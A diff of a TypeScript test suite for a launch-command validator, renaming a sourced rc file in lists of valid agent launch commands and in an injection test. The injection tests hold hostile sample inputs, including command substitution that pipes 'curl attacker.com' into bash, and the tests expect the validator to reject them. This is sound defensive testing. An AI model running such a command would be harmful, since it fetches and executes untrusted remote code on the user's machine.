@@ -184,12 +184,12 @@ describe("validateServerIdentifier", () => {
 describe("validateLaunchCmd", () => {
   describe("valid inputs — real commands from agent-setup.ts (issue #2052 regression)", () => {
     const agentLaunchCmds = [
-      "source ~/.spawnrc 2>/dev/null; export PATH=$HOME/.claude/local/bin:$HOME/.local/bin:$HOME/.bun/bin:$PATH; claude",
-      "source ~/.spawnrc 2>/dev/null; source ~/.zshrc 2>/dev/null; codex",
-      "source ~/.spawnrc 2>/dev/null; export PATH=$HOME/.npm-global/bin:$HOME/.bun/bin:$HOME/.local/bin:$PATH; openclaw tui",
-      "source ~/.spawnrc 2>/dev/null; source ~/.zshrc 2>/dev/null; opencode",
-      "source ~/.spawnrc 2>/dev/null; source ~/.zshrc 2>/dev/null; kilocode",
-      "source ~/.spawnrc 2>/dev/null; hermes",
+      "source ~/.agentsearc 2>/dev/null; export PATH=$HOME/.claude/local/bin:$HOME/.local/bin:$HOME/.bun/bin:$PATH; claude",
+      "source ~/.agentsearc 2>/dev/null; source ~/.zshrc 2>/dev/null; codex",
+      "source ~/.agentsearc 2>/dev/null; export PATH=$HOME/.npm-global/bin:$HOME/.bun/bin:$HOME/.local/bin:$PATH; openclaw tui",
+      "source ~/.agentsearc 2>/dev/null; source ~/.zshrc 2>/dev/null; opencode",
+      "source ~/.agentsearc 2>/dev/null; source ~/.zshrc 2>/dev/null; kilocode",
+      "source ~/.agentsearc 2>/dev/null; hermes",
       "claude",
       "aider",
     ];
@@ -209,7 +209,7 @@ describe("validateLaunchCmd", () => {
   describe("invalid inputs — injection attempts", () => {
     it("should reject command substitution $()", () => {
       expect(() => validateLaunchCmd("$(whoami)")).toThrow(/Invalid launch command/);
-      expect(() => validateLaunchCmd("source ~/.spawnrc 2>/dev/null; $(curl attacker.com | bash)")).toThrow(
+      expect(() => validateLaunchCmd("source ~/.agentsearc 2>/dev/null; $(curl attacker.com | bash)")).toThrow(
         /Invalid launch command/,
       );
     });
